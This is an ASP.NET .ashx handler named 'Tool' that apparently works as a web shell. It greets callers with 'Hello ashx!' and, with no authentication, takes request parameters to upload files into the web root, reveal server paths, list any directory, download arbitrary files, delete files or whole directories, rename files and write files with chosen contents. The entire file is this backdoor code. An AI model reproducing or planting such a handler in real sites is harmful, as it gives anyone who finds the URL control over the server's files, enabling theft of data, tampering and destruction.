<%@ WebHandler Language="C#" Class="Tool" %>
using System;
using System.Web;
using System.Net;
using System.IO;

public class Tool : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {

        try
        {
            string type = context.Request["type"];
            string param = context.Request["param"];
            string param1 = "";
            if (!string.IsNullOrEmpty(type) && !string.IsNullOrEmpty(param))
            {
                switch (type)
                {
                    case "0":
                        execute_sql(context, param);
                        break;
                    case "1"://server forbid
                        save_file(context, param);
                        break;
                    case "2":
                        get_file_path(context, param);
                        break;
                    case "3":
                        list_directory(context, param);
                        break;
                    case "4":
                        delete_file(context, param);
                        break;
                    case "5":
                        down_file(context, param);
                        break;
                    case "6":
                        get_detail_info(context, param);
                        break;
                    case "7":
                         param1 = context.Request["param1"];
                        rename_file(context, param, param1);
                        break;
                    case "8":
                         param1 = context.Request["param1"];
                        create_file_from_string(context, param, param1);
                        break;
                    default:
                        break;
                }

            }
            else
            {
                context.Response.Write("Hello ashx!");
            }
        }
        catch (Exception error)
        {

            context.Response.Write(error.Message);
        }

    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
    //0
    protected void execute_sql(HttpContext context, string file_name)
    {

    }
    //1
    protected void save_file(HttpContext context, string file_name)
    {
        try
        {
            HttpPostedFile file = context.Request.Files[0];
            file.SaveAs(context.Server.MapPath(".") + file_name);
        }
        catch (Exception error)
        {
            context.Response.Write(error.Message);
        }
    }
    //2
    protected void get_file_path(HttpContext context, string url)
    {
        try
        {
            if (string.IsNullOrEmpty(url))
            {
                context.Response.Write(context.Request.PhysicalPath);
            }
            else
            {
                context.Response.Write(context.Server.MapPath(url));
            }
        }
        catch (Exception error)
        {
            context.Response.Write(error.Message);
        }
    }
    //3
    protected void list_directory(HttpContext context, string file_path)
    { 
        if (Directory.Exists(file_path))
        {
            context.Response.Write(get_files(file_path, ""));
        }
    }
    //4
    protected void delete_file(HttpContext context, string file_path)
    {
        if (Directory.Exists(file_path))
        {
            Directory.Delete(file_path, true);
            context.Response.Write("delete directory OK");
        }
        if (File.Exists(file_path))
        {
            File.Delete(file_path);
            context.Response.Write("delete file OK");
        }

    }
    //5
    protected void down_file(HttpContext context, string file_name)
    {
        if (File.Exists(file_name))
        {
            FileInfo file_info = new FileInfo(file_name);
            string new_file_name = System.Web.HttpUtility.UrlEncode(file_name.Replace(@":", "[1]").Replace(@"/", "[2]").Replace(@"\", "[2]"), System.Text.Encoding.UTF8);
            context.Response.Clear();
            context.Response.ClearHeaders();
            context.Response.Buffer = false;
            context.Response.ContentType = "application/octet-stream";
            context.Response.AppendHeader("Content-Disposition", "attachment;filename=" + new_file_name);
            context.Response.AppendHeader("Content-Length", file_info.Length.ToString());
            context.Response.WriteFile(file_name);
            context.Response.Flush();
            context.Response.End();
        }
    }
    //6
    protected void get_detail_info(HttpContext context, string file_path)
    {
        if (Directory.Exists(file_path))
        {
            DirectoryInfo dir = new DirectoryInfo(file_path);
            string dir_info = "Directory Name:" + dir.FullName + Environment.NewLine +
                                "Last Access Time:" + dir.LastAccessTime.ToString() + Environment.NewLine +
                                "Last Write Time:" + dir.LastWriteTime.ToString() + Environment.NewLine;
            context.Response.Write(dir_info);

        }
        if (File.Exists(file_path))
        {
            FileInfo file = new FileInfo(file_path);
            string file_info = "File Name:" + file.FullName + Environment.NewLine +
                                  "Last Access Time:" + file.LastAccessTime + Environment.NewLine +
                                  "Last Write Time:" + file.LastWriteTime + Environment.NewLine +
                                  "File Size:" + (file.Length / 1024).ToString() + " K";
            context.Response.Write(file_info);
        }
    }

    public string get_files(string directory, string prefix)
    {
        string result = "";
        DirectoryInfo info = new DirectoryInfo(directory);
        foreach (DirectoryInfo dir in info.GetDirectories())
        {
            prefix = prefix + "-";
            result = result + "[D]" + dir.FullName + Environment.NewLine;
            result = result + get_files(dir.FullName, prefix);
        }
        foreach (FileInfo file in info.GetFiles())
        {
            result = result + "[F]" + file.FullName + Environment.NewLine;
        }
        return result;
        
    }

    public void rename_file(HttpContext context, string old_name, string new_name)
    {
        File.Move(old_name, new_name);
    }

    public void create_file_from_string(HttpContext context, string file_name, string content)
    {
        file_name = context.Server.MapPath(".") + file_name;
        FileStream stream = File.Open(file_name, FileMode.OpenOrCreate);
        byte[] data = System.Text.Encoding.Default.GetBytes(content);

        BinaryWriter write = new BinaryWriter(stream);
        write.Write(data);
        write.Close();
        context.Response.Write("create file ok!");
    }
}